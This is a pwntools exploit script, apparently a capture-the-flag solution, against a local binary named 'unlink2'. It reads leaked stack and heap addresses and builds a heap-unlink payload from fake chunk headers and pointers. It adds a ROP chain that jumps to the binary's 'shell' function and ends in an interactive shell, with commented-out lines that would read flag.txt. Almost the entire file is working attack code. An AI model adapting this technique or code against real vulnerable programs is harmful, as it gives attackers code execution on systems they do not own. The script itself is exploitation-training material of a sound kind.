#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template unlink2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'unlink2')

context.terminal = ['kitty']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DBG NOASLR
if args.DBG:
	context.log_level = 'debug'



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def cyc(a): return cyclic(a)
def inr() : return p.interactive()
def rrw(var, list) : [var.raw(i) for i in list]
def rfg(var,a) : return var.find_gadget(a)
def rch(var) : return var.chain()
def rdm(var) : return var.dump()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b * 0x40127b
b unlink
b * unlink+39
set max-visualize-chunk-size 100
continue
'''.format(**locals())

'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
                        BEGIN EXPLOIT
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

p = start()

ru(b'stack address leak: '); stack_leak = int(rv(14),16) + 0x18 
ru(b'heap address leak: '); heap_leak = int(rv(10),16) - 0x6b0

info(f"STACK: {hex(stack_leak)}")
info(f"HEAP: {hex(heap_leak)}")
if "0a" in hex(stack_leak): warn("\n FOUND")

rop = ROP(exe)
next = stack_leak - 0x48
prev = heap_leak + 0x710
info(f"NEXT: {hex(next)}")
info(f"PREV: {hex(prev)}")
payl = [0, 0x21, next, prev, 0, 0x21, exe.sym["shell"], exe.sym["shell"], 0, 0x411, exe.sym["shell"], rfg(rop, ["ret"])[0], exe.sym["shell"]]
rrw(rop,payl)
payload = rch(rop)

sla(b'shell',payload)

# sl(b"echo '$$'")
# ru(b'$$\n')
# sl(b'cat flag.txt')
# flag = ru(b'}').decode()
# log.success(f"FLAG: {flag}")

inr()

